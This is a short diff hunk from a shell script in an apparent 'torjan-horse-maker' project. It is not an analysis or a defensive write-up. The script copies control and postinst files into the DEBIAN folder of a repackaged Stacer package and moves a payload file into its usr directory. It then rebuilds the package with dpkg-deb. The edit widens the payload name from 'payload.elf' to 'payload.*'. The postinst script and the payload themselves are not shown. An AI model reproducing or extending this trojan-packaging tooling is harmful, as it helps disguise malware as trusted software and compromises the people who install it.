@@ -10,7 +10,7 @@ mv control postinst ~/Desktop/torjan-horse-maker/stacer_1.1.0_amd64/DEBIAN
 cd ..
 rm main.zip
 cd ..
-mv payload.elf ~/Desktop/torjan-horse-maker/stacer_1.1.0_amd64/usr/
+mv payload.* ~/Desktop/torjan-horse-maker/stacer_1.1.0_amd64/usr/
 dpkg-deb --build stacer_1.1.0_amd64
 rm -r stacer_1.1.0_amd64
 
